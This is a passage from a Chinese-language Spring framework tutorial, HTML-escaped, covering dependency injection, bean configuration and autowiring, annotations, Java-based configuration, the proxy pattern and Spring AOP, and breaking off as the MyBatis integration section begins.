value=&quot;狂神&quot;/&gt;&lt;/bean&gt;\n\n参数名\n&lt;!--有参构造器3，参数名--&gt;&lt;bean id=&quot;user&quot; class=&quot;nuc.ss.pojo.User&quot;&gt;    &lt;constructor-arg name=&quot;name&quot; value=&quot;狂神&quot;/&gt;&lt;/bean&gt;\n\n总结：在配置文件加载的时候。其中管理的对象都已经初始化了！\n5、Spring配置5.1、别名&lt;!--别名，如果添加了别名也可以使用别名获取到这个对象--&gt;&lt;alias name=&quot;user&quot; alias=&quot;userNew&quot;/&gt;\n\n5.2、Bean的配置&lt;!--        id:bean的唯一标识符，也就是相当于我们学的对象名        class：bean 对象所对应的权限定名：包名 + 类型        name: 也是别名,而且name更高级，可以起多个别名，通过逗号空格分号等分割--&gt;&lt;bean id=&quot;userT&quot; class=&quot;nuc.ss.pojo.UserT&quot; name=&quot;userT2,t2&quot;&gt;    &lt;property name=&quot;name&quot; value=&quot;西部开源&quot;/&gt;&lt;/bean&gt;\n\n5.3、import团队的合作通过import来实现 ,可以将多个配置文件，导入合并为一个\n假设，现在项目中有多个人开发，这三个人复制不同的类开发，不同的类需要不同的bean中，我们可以利用import将所有人的beans.xml合并为一个总的\n\n张三 beans.xml\n李四 beans2.xml\n王五 beans3.xml\napplicationContext\n\n&lt;import resource=&quot;beans.xml&quot;/&gt;&lt;import resource=&quot;beans2.xml&quot;/&gt;&lt;import resource=&quot;beans3.xml&quot;/&gt;\n\n使用的时候，直接使用总的配置就可以了\n6、依赖注入6.1、构造器注入前面已经说过了\n6.2、set方式注入【重点】\n依赖注入（Dependency Injection,DI）。\n依赖 : 指Bean对象的创建依赖于容器 . Bean对象的依赖资源 .\n注入 : 指Bean对象所依赖的资源 , 由容器来设置和装配 .\n\n\n\n【环境搭建】\n\n复杂类型 Address.java\npublic class Address &#123;    private String address;    public String getAddress() &#123;        return address;    &#125;    public void setAddress(String address) &#123;        this.address = address;    &#125;    @Override    public String toString() &#123;        return &quot;Address&#123;&quot; +                &quot;address=&#x27;&quot; + address + &#x27;\\&#x27;&#x27; +                &#x27;&#125;&#x27;;    &#125;&#125;\n\n\n\n真实测试对象 Student.java\npublic class Student &#123;    private String name;    private Address address;    private String[] books;    private List&lt;String&gt; hobbies;    private Map&lt;String,String&gt; card;    private Set&lt;String&gt; games;    private String wife;    private Properties info;    public String getName() &#123;        return name;    &#125;    public void setName(String name) &#123;        this.name = name;    &#125;    public Address getAddress() &#123;        return address;    &#125;    public void setAddress(Address address) &#123;        this.address = address;    &#125;    public String[] getBooks() &#123;        return books;    &#125;    public void setBooks(String[] books) &#123;        this.books = books;    &#125;    public List&lt;String&gt; getHobbies() &#123;        return hobbies;    &#125;    public void setHobbies(List&lt;String&gt; hobbies) &#123;        this.hobbies = hobbies;    &#125;    public Map&lt;String, String&gt; getCard() &#123;        return card;    &#125;    public void setCard(Map&lt;String, String&gt; card) &#123;        this.card = card;    &#125;    public Set&lt;String&gt; getGames() &#123;        return games;    &#125;    public void setGames(Set&lt;String&gt; games) &#123;        this.games = games;    &#125;    public String getWife() &#123;        return wife;    &#125;    public void setWife(String wife) &#123;        this.wife = wife;    &#125;    public Properties getInfo() &#123;        return info;    &#125;    public void setInfo(Properties info) &#123;        this.info = info;    &#125;    @Override    public String toString() &#123;        return &quot;Student&#123;&quot; +                &quot;name=&#x27;&quot; + name + &#x27;\\&#x27;&#x27; +                &quot;, address=&quot; + address.toString +                &quot;, books=&quot; + Arrays.toString(books) +                &quot;, hobbies=&quot; + hobbies +                &quot;, card=&quot; + card +                &quot;, games=&quot; + games +                &quot;, wife=&#x27;&quot; + wife + &#x27;\\&#x27;&#x27; +                &quot;, info=&quot; + info +                &#x27;&#125;&#x27;;    &#125;&#125;\n\nbeans.xml\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;    &lt;bean id=&quot;address&quot; class=&quot;nuc.ss.pojo.Address&quot;&gt;        &lt;property name=&quot;address&quot; value=&quot;西安&quot;/&gt;    &lt;/bean&gt;    &lt;bean id=&quot;student&quot; class=&quot;nuc.ss.pojo.Student&quot;&gt;        &lt;!--第一种，普通值注入 value--&gt;        &lt;property name=&quot;name&quot; value=&quot;狂神&quot;/&gt;        &lt;!--第二种： Bean注入 ref--&gt;        &lt;property name=&quot;address&quot; ref=&quot;address&quot;/&gt;        &lt;!--第三种： 数组注入 --&gt;        &lt;property name=&quot;books&quot;&gt;            &lt;array&gt;                &lt;value&gt;红楼梦&lt;/value&gt;                &lt;value&gt;西游记&lt;/value&gt;                &lt;value&gt;水浒传&lt;/value&gt;                &lt;value&gt;三国演义&lt;/value&gt;            &lt;/array&gt;        &lt;/property&gt;        &lt;!--第四种：list注入--&gt;        &lt;property name=&quot;hobbies&quot;&gt;            &lt;list&gt;                &lt;value&gt;听歌&lt;/value&gt;                &lt;value&gt;敲代码&lt;/value&gt;                &lt;value&gt;看电影&lt;/value&gt;            &lt;/list&gt;        &lt;/property&gt;        &lt;!--第五种：map注入--&gt;        &lt;property name=&quot;card&quot;&gt;            &lt;map&gt;                &lt;entry key=&quot;身份证&quot; value=&quot;111111111111111111&quot;/&gt;                &lt;entry key=&quot;银行卡&quot; value=&quot;22222222222222222222&quot;/&gt;            &lt;/map&gt;        &lt;/property&gt;        &lt;!--第六种：set注入--&gt;        &lt;property name=&quot;games&quot;&gt;            &lt;set&gt;                &lt;value&gt;LOL&lt;/value&gt;                &lt;value&gt;COC&lt;/value&gt;                &lt;value&gt;BOB&lt;/value&gt;            &lt;/set&gt;        &lt;/property&gt;        &lt;!--第七种：null注入--&gt;        &lt;property name=&quot;wife&quot;&gt;            &lt;null/&gt;        &lt;/property&gt;        &lt;!--第七种：Properties注入--&gt;        &lt;property name=&quot;info&quot;&gt;            &lt;props&gt;                &lt;prop key=&quot;driver&quot;&gt;com.mysql.jdbc.Driver&lt;/prop&gt;                &lt;prop key=&quot;url&quot;&gt;localhost://3306&lt;/prop&gt;                &lt;prop key=&quot;username&quot;&gt;root&lt;/prop&gt;                &lt;prop key=&quot;password&quot;&gt;admin&lt;/prop&gt;            &lt;/props&gt;        &lt;/property&gt;    &lt;/bean&gt;&lt;/beans&gt;\n\n测试类\npublic class MyTest &#123;    public static void main(String[] args) &#123;        ApplicationContext context = new ClassPathXmlApplicationContext(&quot;beans.xml&quot;);        Student student = (Student)context.getBean(&quot;student&quot;);        System.out.println(student);    &#125;&#125;\n\n6.3、拓展方式注入我们可以使用p命令空间和c命令空间进行注入\n官方解释：\n\n使用！\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;       xmlns:p=&quot;http://www.springframework.org/schema/p&quot;       xmlns:c=&quot;http://www.springframework.org/schema/c&quot;       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;    &lt;!--p命名空间可以直接注入属性的值 property--&gt;    &lt;bean id=&quot;user&quot; class=&quot;nuc.ss.pojo.User&quot; p:name=&quot;狂神&quot; p:age=&quot;18&quot;/&gt;    &lt;!--c命名空间可以通过构造器注入 construct-args--&gt;    &lt;bean id=&quot;user&quot; class=&quot;nuc.ss.pojo.User&quot; c:age=&quot;18&quot; c:name=&quot;狂神2&quot;/&gt;&lt;/beans&gt;\n\n测试：\n@Testpublic void test2() &#123;    ApplicationContext context = new ClassPathXmlApplicationContext(&quot;userBeans.xml&quot;);    //User user = (User)context.getBean(&quot;user&quot;);    User user = context.getBean(&quot;user&quot;, User.class);    System.out.println(user);&#125;\n\n注意点：p命名和c命名空间不能直接使用，需要引入xml约束!\nxmlns:p=&quot;http://www.springframework.org/schema/p&quot;xmlns:c=&quot;http://www.springframework.org/schema/c&quot;\n\n\n\n6.4、Bean的作用域\n\n单例模式(Spring默认机制)\n&lt;bean id=&quot;user&quot; class=&quot;nuc.ss.pojo.User&quot; scope=&quot;singleton&quot;/&gt;\n\n原型模式：每次从容器中get的时候，都会产生一个现对象！\n&lt;bean id=&quot;user&quot; class=&quot;nuc.ss.pojo.User&quot; scope=&quot;prototype&quot;/&gt;\n\n其余的request、session、application这些个只能在web开发中使用到\n\n\n7、Bean的自动装配\n自动装配是Spring满足bean依赖的一种方式\nSpring会在上下文自动寻找，并自动给bean装配属性！\n\n在Spring中有三种自动装配的方式\n\n在xml中显示的配置\n在java中显示配置\n隐式的自动装配bean【重要】\n\n这里我们主要讲第三种：自动化的装配bean。\n7.1、测试环境搭建：一个人有两个宠物\n7.2、ByName自动装配&lt;bean id=&quot;cat&quot; class=&quot;nuc.ss.pojo.Cat&quot;/&gt;&lt;bean id=&quot;dog&quot; class=&quot;nuc.ss.pojo.Dog&quot;/&gt;&lt;!--    byName:会自动在容器上下文中套接，和自己对象的set方法后面的值相对应的beanid--&gt;&lt;bean id=&quot;people&quot; class=&quot;nuc.ss.pojo.People&quot; autowire=&quot;byName&quot;&gt;    &lt;property name=&quot;name&quot; value=&quot;狂神&quot;/&gt;&lt;/bean&gt;\n\n7.3、ByType自动装配&lt;bean id=&quot;cat&quot; class=&quot;nuc.ss.pojo.Cat&quot;/&gt;&lt;bean id=&quot;dog&quot; class=&quot;nuc.ss.pojo.Dog&quot;/&gt;&lt;!--    byType:会自动在容器上下文中套接，和自己对象属性类型相同的beanid--&gt;&lt;bean id=&quot;people&quot; class=&quot;nuc.ss.pojo.People&quot; autowire=&quot;byType&quot;&gt;    &lt;property name=&quot;name&quot; value=&quot;狂神&quot;/&gt;&lt;/bean&gt;\n\n小结：\n\nbyname的时候，需要保证所有bean的id唯一，并且这个bean需要和自动注入的属性的set方法的值一致\nbytype的时候，需要保证所有bean的class唯一，并且这个bean需要和自动注入的属性的类型一致\n\n7.4、使用注解实现自动装配jdk1.5支持的注解，Spring2.5就支持注解了！\nThe introduction of annotation-based configuration raised the question of whether this approach is “better” than XML. \n要使用注解需知：\n\n导入约束：context支持\n\n配置注解的支持：context:annotation-config/ \n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;    xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;    xmlns:context=&quot;http://www.springframework.org/schema/context&quot;    xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans        https://www.springframework.org/schema/beans/spring-beans.xsd        http://www.springframework.org/schema/context        https://www.springframework.org/schema/context/spring-context.xsd&quot;&gt;    &lt;context:annotation-config/&gt;&lt;/beans&gt;\n\n@Autowired注解\n需要导入 spring-aop的包！\n\n直接在属性上使用即可！也可以在set方式上使用！\n\n使用Autowired我们可以不用编写set方法，前提是你这个自动装配的属性在IOC（Spring）容器中存在，且符合名字byName和类型byType！\n\n正常1（byName）\n&lt;bean id=&quot;cat&quot; class=&quot;nuc.ss.pojo.Cat&quot;/&gt;&lt;bean id=&quot;dog&quot; class=&quot;nuc.ss.pojo.Dog&quot;/&gt;&lt;bean id=&quot;people&quot; class=&quot;nuc.ss.pojo.People&quot;/&gt;\n\n正常2（byType）\n&lt;bean id=&quot;cat111&quot; class=&quot;nuc.ss.pojo.Cat&quot;/&gt;&lt;bean id=&quot;dog222&quot; class=&quot;nuc.ss.pojo.Dog&quot;/&gt;&lt;bean id=&quot;people&quot; class=&quot;nuc.ss.pojo.People&quot;/&gt;\n\n正常3（混合使用，先类型后名字）\n&lt;bean id=&quot;cat11&quot; class=&quot;nuc.ss.pojo.Cat&quot;/&gt;&lt;bean id=&quot;cat&quot; class=&quot;nuc.ss.pojo.Cat&quot;/&gt;&lt;bean id=&quot;dog222&quot; class=&quot;nuc.ss.pojo.Dog&quot;/&gt;&lt;bean id=&quot;people&quot; class=&quot;nuc.ss.pojo.People&quot;/&gt;\n\n不正常（多种类型且名字也不匹配，报错）\n&lt;bean id=&quot;cat11&quot; class=&quot;nuc.ss.pojo.Cat&quot;/&gt;&lt;bean id=&quot;cat111&quot; class=&quot;nuc.ss.pojo.Cat&quot;/&gt;&lt;bean id=&quot;dog22&quot; class=&quot;nuc.ss.pojo.Dog&quot;/&gt;&lt;bean id=&quot;dog222&quot; class=&quot;nuc.ss.pojo.Dog&quot;/&gt;&lt;bean id=&quot;people&quot; class=&quot;nuc.ss.pojo.People&quot;/&gt;\n\n\n科普：\n@Nullable 字段标记了这个注解，说明这个字段可以为null\n\npublic @interface Autowired &#123;    boolean required() default true;&#125;\n\n测试代码\npublic class People &#123;    //如果显示的定义了Autowired的required属性为false，说明这个对象可以为null，否则不允许为空    @Autowired(required = false)    private Cat cat;    @Autowired    private Dog dog;    private String name;&#125;\n\n如果@Autowired自动装配的环境比较复杂，自动装配无法通过一个注解【@Autowired】完成的时候，我们可以使用@Qualifilter(value&#x3D;”xxx”)去配合@Autowired的使用，指定一个唯一的bean对象注入\npublic class People &#123;    @Autowired    @Qualifier(value = &quot;cat11&quot;)    private Cat cat;    @Autowired    @Qualifier(value=&quot;dog222&quot;)    private Dog dog;    private String name;&#125;\n\nResource注解public class People &#123;    @Resource(name = &quot;cat1&quot;)    private Cat cat;    @Resource    private Dog dog;    private String name;&#125;\n\n小结：\n@Resource和@Autowired\n\n都是用来自动装配的，都可以放在属性字段上\n实现方式不同\n@Autowired默认通过bytype的方式实现，如果有多个类型，则通过byname实现，如果两个都找不到，就报错！\n@Resource默认通过byname的方式实现，如果找不到名字，则通过bytype实现，如果两个都找不到，就报错！\n\n\n执行的顺序不同：\n@Autowired默认通过bytype的方式实现\n@Resource默认通过byname的方式实现\n\n\n类型重复的话，如果名字不是默认的（如cat11，cat111，而没有默认的cat）\n@Autowired配合@Qualifier(value &#x3D; “cat11”)使用\n@Resource直接使用@Resource(name &#x3D; “cat11”)\n\n\n\n\n\n8.使用注解开发在Spring4之后，要使用注解开发，必须要保证aop的包导入了\n\n使用注解需要导入context约束，增加注解的支持！\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;    xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;    xmlns:context=&quot;http://www.springframework.org/schema/context&quot;    xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans        https://www.springframework.org/schema/beans/spring-beans.xsd        http://www.springframework.org/schema/context        https://www.springframework.org/schema/context/spring-context.xsd&quot;&gt;    &lt;context:annotation-config/&gt;&lt;/beans&gt;\n\n\nbean\n// 等价于 &lt;bean id=&quot;user&quot; class=&quot;nuc.ss.pojo.User&quot;/&gt;@Component\n\n属性如何注入@Value(“xxx”)\n@Componentpublic class User &#123;    //相当于&lt;property name=&quot;name&quot; value=&quot;狂神&quot;/&gt;    @Value(&quot;狂神&quot;)    public String name;&#125;\n\n衍生的注解\n@Component有几个衍生的注解，我们在web开发中，会按照mvc三层架构分层！\n\ndao【@Repository】\n\nservice 【@Service】\n\ncontroller 【@Controller】\n这四个注解功能都是一样的，都是代表将某个注册类注入到Spring中，装配Bean\n\n\n\n自动装配置\n\n@Autowired：自动装配通过类型、名字\n如果Autowired不能唯一自动装配上属性，则需要通过@Qualifilter(value&#x3D;”xxx”)\n\n\n@Nullable：字段标记了这个注解，说明这个字段可以为null\n@Resource：自动装配通过名字、类型\n\n\n作用域 @Scope\n@Component@Scope(&quot;singleton&quot;)public class User &#123;    public String name;    //相当于&lt;property name=&quot;name&quot; value=&quot;狂神&quot;/&gt;    @Value(&quot;狂神&quot;)    public void setName(String name) &#123;        this.name = name;    &#125;&#125;\n\n\n\n小结\nxml与注解\n\nxml更加万能，适用于任何场合！维护简单方便\n注解不是自己的类用不了，维护相对复杂\n\nxml与注解的最佳实践：\n\nxml用来管理bean;\n\n注解只负责完成属性的注入;\n\n我们在使用的过程中，只需要注意一个问题：必须让注解生效，就需要开启注解支持\n&lt;!--指定要扫描的包，这个包下面的注解就会生效--&gt;&lt;context:component-scan base-package=&quot;nuc.ss&quot;/&gt;&lt;context:annotation-config/&gt;\n\n\n\n9.使用java的方式配置Spring我们现在要完全不适用Spring的xml配置了，全权交给java来做\njavaConfig是Spring的一个子项目，在Spring4之后，它成为了一个核心功能！\n\n实体类\n//这里这个注解的意思，就是说明这个类被Spring接管了。注解到了容器中@Componentpublic class User &#123;    private String name;    public String getName() &#123;        return name;    &#125;    //属性注入值    @Value(&quot;狂神&quot;)    public void setName(String name) &#123;        this.name = name;    &#125;    @Override    public String toString() &#123;        return &quot;User&#123;&quot; +                &quot;name=&#x27;&quot; + name + &#x27;\\&#x27;&#x27; +                &#x27;&#125;&#x27;;    &#125;&#125;\n\n配置文件\n//这个也被Spring容器托管，注册到容器里，因为他本来就是一个@Component，// @Component代表这是一个配置类，就和我们之前看的beans.xml是一样的@Configuration@ComponentScan(&quot;nuc.ss.pojo&quot;)@Import(MyConfig2.class)public class MyConfig &#123;    //注册一个bean，就相当于我们之前写的一个bean标签，    //这个方法的名字就相当于bean标签的id属性    //这个方法的返回值,就相当于bean标签中的class属性    @Bean    public User getUser() &#123;        return new User();//就是要返回注入到bean的对象!    &#125;&#125;\n\n测试类！\n@Testpublic void test1() &#123;    // 如果完全使用了配置类的方式去做,我们就只能通过AnnotationConfig 上下文来获取容器,通过配置类的class对象加载!    ApplicationContext context = new AnnotationConfigApplicationContext(MyConfig.class);    User getUser = context.getBean(&quot;getUser&quot;, User.class);    System.out.println(getUser.getName());&#125;\n\n这种纯java的配置方式，在SpringBoot中随处可见！\n10、代理模式为什么要学习代理模式？因为这就是SpringAOP的底层！【SpringAOP和SpringMVC】\n代理模式的分类：\n\n静态代理\n动态代理\n\n\n10.1、静态代理角色分析：\n\n抽象角色：一般会使用接口或者抽象类来解决\n真实角色：被代理的角色\n代理角色：代理真实角色，代理真实角色后，我们一般会做一些附属操作\n客户：访问代理对象的人！\n\n代码步骤：\n\n接口\npublic interface Rent &#123;    public void rent();&#125;\n\n真实角色\n//房东public class Host implements Rent &#123;    public void rent() &#123;        System.out.println(&quot;房东要出租房子&quot;);    &#125;&#125;\n\n代理角色\npublic class Proxy implements Rent &#123;    private Host host;    public Proxy() &#123;    &#125;    public Proxy(Host host) &#123;        this.host = host;    &#125;    public void rent() &#123;        seeHouse();        fare();        contract();        host.rent();    &#125;    //看房    public void seeHouse() &#123;        System.out.println(&quot;中介带你看房&quot;);    &#125;    //收中介费    public void fare() &#123;        System.out.println(&quot;收中介费&quot;);    &#125;    //收中介费    public void contract() &#123;        System.out.println(&quot;签租赁合同&quot;);    &#125;&#125;\n\n客户端访问代理角色\npublic class Client &#123;    public static void main(String[] args) &#123;        //房东要租房子        Host host = new Host();        //代理，中介帮房东租房子，但是代理一般会有一些附属操作        Proxy proxy = new Proxy(host);        //你不用面对房东，直接面对中介        proxy.rent();    &#125;&#125;\n\n静态代理模式的好处：\n\n可以使真实角色的操作更加纯粹！不用去关注一些公共的业务\n公共也就交给代理角色！实现了业务的分工！\n公共业务发生扩展的时候，方便集中管理！\n\n缺点：\n\n一个真实角色就会产生一个代理角色；\n代码量会翻倍-开发效率会变低\n\n10.2 、加深理解代码：\n\n接口\npublic interface UserService &#123;    public void add();    public void delete();    public void update();    public void query();&#125;\n\n真实角色：改动原有的业务代码，在公司中是大忌！\n//真实对象public class UserServiceImpl implements UserService &#123;    public void add() &#123;        System.out.println(&quot;增加了一个用户&quot;);    &#125;    public void delete() &#123;        System.out.println(&quot;删除了一个用户&quot;);    &#125;    public void update() &#123;        System.out.println(&quot;修改了一个用户&quot;);    &#125;    public void query() &#123;        System.out.println(&quot;查询了一个用户&quot;);    &#125;&#125;\n\n需求来了，现在我们需要增加一个日志功能，怎么实现！\n\n思路1 ：在实现类上增加代码 【麻烦！】\n思路2：使用代理来做，能够不改变原来的业务情况下，实现此功能就是最好的了！\n\n\n设置一个代理类来处理日志！代理角色\npublic class UserServiceProxy implements UserService &#123;    private UserService userService;    public void setUserService(UserService userService) &#123;        this.userService = userService;    &#125;    public void add() &#123;        log(&quot;add&quot;);        userService.add();    &#125;    public void delete() &#123;        log(&quot;delete&quot;);        userService.delete();    &#125;    public void update() &#123;        log(&quot;update&quot;);        userService.update();    &#125;    public void query() &#123;        log(&quot;query&quot;);        userService.query();    &#125;    //日志方法    private void log(String msg) &#123;        System.out.println(&quot;使用了&quot; + msg + &quot;方法&quot;);    &#125;&#125;\n\n客户端访问代理角色\npublic class Client &#123;    public static void main(String[] args) &#123;        UserService userService = new UserServiceImpl();        UserServiceProxy proxy = new UserServiceProxy();        proxy.setUserService(userService);        proxy.add();    &#125;&#125;\n\n我们在不改变原来的代码的情况下，实现了对原有功能的增强，这是AOP中最核心的思想\n聊聊AOP：纵向开发，横向开发\n\n10.3、动态代理\n动态代理和静态代理角色一样\n动态代理的代理类是动态生成的，不是 我们直接写好的！\n动态代理分为两大类：基于接口的动态代理、基于类的动态代理\n基于接口：JDK动态代理【我们在这里使用】\n基于类：cglib\njava字节码实现：javasist\n\n\n\n需要了解两个类：Proxy：代理，InvocationHandler：调用处理程序\n动态代理的好处：\n\n可以使真实角色的操作更加纯粹！不用去关注一些公共的业务\n公共也就交给代理角色！实现了业务的分工！\n公共业务发生扩展的时候，方便集中管理！\n一个动态代理类代理的是一个接口，一般就是对应的一类业务\n一个动态代理类可以代理多个类，只要是实现了同一个接口即可【核心】\n\n11、AOP11.1、什么是AOPAOP（Aspect Oriented Programming）意为：面向切面编程，通过预编译方式和运行期动态代理实现程序功能的统一维护的一种技术。AOP是OOP的延续，是软件开发中的一个热点，也是Spring框架中的一个重要内容，是函数式编程的一种衍生范型。利用AOP可以对业务逻辑的各个部分进行隔离，从而使得业务逻辑各部分之间的耦合度降低，提高程序的可重用性，同时提高了开发的效率。\n\n11.2、Aop在Spring中的作用提供声明式事务；允许用户自定义切面\n以下名词需要了解下：\n\n横切关注点：跨越应用程序多个模块的方法或功能。即是，与我们业务逻辑无关的，但是我们需要关注的部分，就是横切关注点。如日志 , 安全 , 缓存 , 事务等等 ….\n切面（ASPECT）：横切关注点 被模块化 的特殊对象。即，它是一个类。Log\n通知（Advice）：切面必须要完成的工作。即，它是类中的一个方法。Log方法\n目标（Target）：被通知对象。接口\n代理（Proxy）：向目标对象应用通知之后创建的对象。代理类\n切入点（PointCut）：切面通知 执行的 “地点”的定义。method\n连接点（JointPoint）：与切入点匹配的执行点。invoke\n\n\nSpringAOP中，通过Advice定义横切逻辑，Spring中支持5种类型的Advice:\n\n\n\n通知类型\n连接点\n实现接口\n\n\n\n前置通知\n方法前\norg.springframework.aop.MethodBeforeAdvice\n\n\n后置通知\n方法后\norg.springframework.aop.AfterReturningAdvice\n\n\n环绕通知\n方法前后\norg.aopalliance.intercept.MethodInterceptor\n\n\n异常抛出通知\n方法抛出异常\norg.springframework.aop.ThrowsAdvice\n\n\n引介通知\n类中增加新的方法属性\norg.springframework.aop.IntroductionInterceptor\n\n\n即 Aop 在 不改变原有代码的情况下 , 去增加新的功能 .\n11.3、使用Spring实现Aop【重点】使用AOP织入，需要导入一个依赖包！\n&lt;!-- https://mvnrepository.com/artifact/org.aspectj/aspectjweaver --&gt;&lt;dependency&gt;       &lt;groupId&gt;org.aspectj&lt;/groupId&gt;    &lt;artifactId&gt;aspectjweaver&lt;/artifactId&gt;    &lt;version&gt;1.9.4&lt;/version&gt;&lt;/dependency&gt;\n\n\n\n方式一：使用Spring的API接口【主要SpringAPI接口实现】\n\n首先编写我们的业务接口和实现类\npublic interface UserService &#123;   public void add();   public void delete();   public void update();   public void select();&#125;\n\npublic class UserServiceImpl implements UserService&#123;   @Override   public void add() &#123;       System.out.println(&quot;增加用户&quot;);  &#125;   @Override   public void delete() &#123;       System.out.println(&quot;删除用户&quot;);  &#125;   @Override   public void update() &#123;       System.out.println(&quot;更新用户&quot;);  &#125;   @Override   public void select() &#123;       System.out.println(&quot;查询用户&quot;);  &#125;&#125;\n\n写我们的增强类 , 我们编写两个 , 一个前置增强 一个后置增强\npublic class Log implements MethodBeforeAdvice &#123;   //method : 要执行的目标对象的方法   //objects : 被调用的方法的参数   //Object : 目标对象   @Override   public void before(Method method, Object[] objects, Object o) throws Throwable &#123;       System.out.println( o.getClass().getName() + &quot;的&quot; + method.getName() + &quot;方法被执行了&quot;);  &#125;&#125;\n\npublic class AfterLog implements AfterReturningAdvice &#123;   //returnValue 返回值   //method被调用的方法   //args 被调用的方法的对象的参数   //target 被调用的目标对象   @Override   public void afterReturning(Object returnValue, Method method, Object[] args, Object target) throws Throwable &#123;       System.out.println(&quot;执行了&quot; + target.getClass().getName()       +&quot;的&quot;+method.getName()+&quot;方法,&quot;       +&quot;返回值：&quot;+returnValue);  &#125;&#125;\n\n在spring的文件中注册 , 并实现aop切入实现 , 注意导入约束 .\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;      xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;      xmlns:aop=&quot;http://www.springframework.org/schema/aop&quot;      xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans       http://www.springframework.org/schema/beans/spring-beans.xsd       http://www.springframework.org/schema/aop       http://www.springframework.org/schema/aop/spring-aop.xsd&quot;&gt;   &lt;!--注册bean--&gt;   &lt;bean id=&quot;userService&quot; class=&quot;nuc.ss.service.UserServiceImpl&quot;/&gt;   &lt;bean id=&quot;log&quot; class=&quot;nuc.ss.log.Log&quot;/&gt;   &lt;bean id=&quot;afterLog&quot; class=&quot;nuc.ss.log.AfterLog&quot;/&gt;   &lt;!--aop的配置--&gt;   &lt;aop:config&gt;       &lt;!--切入点 expression:表达式匹配要执行的方法--&gt;       &lt;aop:pointcut id=&quot;pointcut&quot; expression=&quot;execution(* nuc.ss.service.UserServiceImpl.*(..))&quot;/&gt;       &lt;!--执行环绕; advice-ref执行方法 . pointcut-ref切入点--&gt;       &lt;aop:advisor advice-ref=&quot;log&quot; pointcut-ref=&quot;pointcut&quot;/&gt;       &lt;aop:advisor advice-ref=&quot;afterLog&quot; pointcut-ref=&quot;pointcut&quot;/&gt;   &lt;/aop:config&gt;&lt;/beans&gt;\n\n测试\npublic class MyTest &#123;   @Test   public void test()&#123;       ApplicationContext context = new ClassPathXmlApplicationContext(&quot;beans.xml&quot;);       UserService userService = (UserService) context.getBean(&quot;userService&quot;);       userService.select();  &#125;&#125;\n\nAop的重要性 : 很重要 . 一定要理解其中的思路 , 主要是思想的理解这一块 .\n**Spring的Aop就是将公共的业务 (日志 , 安全等) 和领域业务结合起来 , 当执行领域业务时 , 将会把公共业务加进来 . 实现公共业务的重复利用 . 领域业务更纯粹 , 程序猿专注领域业务 , 其本质还是动态代理 . **\n方式二：自定义来实现【主要是切面定义】\n目标业务类不变依旧是userServiceImpl\n\n写我们自己的一个切入类\npublic class DiyPointCut &#123;    public void before() &#123;        System.out.println(&quot;==========方法执行前============&quot;);    &#125;    public void after() &#123;        System.out.println(&quot;==========方法执行后============&quot;);    &#125;&#125;\n\n去spring中配置\n&lt;!--方式二：自定义类--&gt;&lt;!--注册bean--&gt;&lt;bean id=&quot;diy&quot; class=&quot;nuc.ss.diy.DiyPointCut&quot;/&gt;&lt;!--aop的配置--&gt;&lt;aop:config&gt;    &lt;!--自定义切面，ref要引用的类--&gt;    &lt;aop:aspect ref=&quot;diy&quot;&gt;        &lt;!--切入点--&gt;        &lt;aop:pointcut id=&quot;point&quot; expression=&quot;execution(* nuc.ss.service.UserServiceImpl.*(..))&quot;/&gt;        &lt;aop:before method=&quot;before&quot; pointcut-ref=&quot;point&quot;/&gt;        &lt;aop:after method=&quot;after&quot; pointcut-ref=&quot;point&quot;/&gt;        &lt;!--通知--&gt;    &lt;/aop:aspect&gt;&lt;/aop:config&gt;\n\n测试：\n@Testpublic void test1() &#123;    ApplicationContext context = new ClassPathXmlApplicationContext(&quot;applicationContext.xml&quot;);    UserService userService = (UserService)context.getBean(&quot;userService&quot;);    userService.add();&#125;\n\n方式三：使用注解实现！\n\n编写一个注解实现的增强类\n//方式三：使用注解的方式实现AOP@Aspect//标注这个类是一个切面public class AnnotationPointCut &#123;    @Before(&quot;execution(* nuc.ss.service.UserServiceImpl.*(..))&quot;)    public void before() &#123;        System.out.println(&quot;==========方法执行前============&quot;);    &#125;    @After(&quot;execution(* nuc.ss.service.UserServiceImpl.*(..))&quot;)    public void after() &#123;        System.out.println(&quot;==========方法执行后============&quot;);    &#125;    //在环绕增强中，我们可以给定一个参数，代表我们要获取处理切入的点    @Around(&quot;execution(* nuc.ss.service.UserServiceImpl.*(..))&quot;)    public void around(ProceedingJoinPoint jp) throws Throwable &#123;        System.out.println(&quot;==========环绕前============&quot;);        //获取签名        //Signature signature = jp.getSignature();        //System.out.println(&quot;signature:&quot; + signature);        //执行方法        Object proceed = jp.proceed();        System.out.println(&quot;==========环绕后============&quot;);    &#125;&#125;\n\n在Spring配置文件中，注册bean，并增加支持注解的配置\n&lt;!--方式三：注解--&gt;&lt;bean id=&quot;annotationPointCut&quot; class=&quot;nuc.ss.diy.AnnotationPointCut&quot;/&gt;&lt;!--开启注解支持: JDK（默认proxy-target-class=&quot;false&quot;） cglib--&gt;&lt;aop:aspectj-autoproxy proxy-target-class=&quot;true&quot;/&gt;\n\n12、整合Mybatis步骤：\n\n导入相关jar包\n\njunit\n&lt;dependency&gt;   &lt;groupId&gt;junit&lt;/groupId&gt;   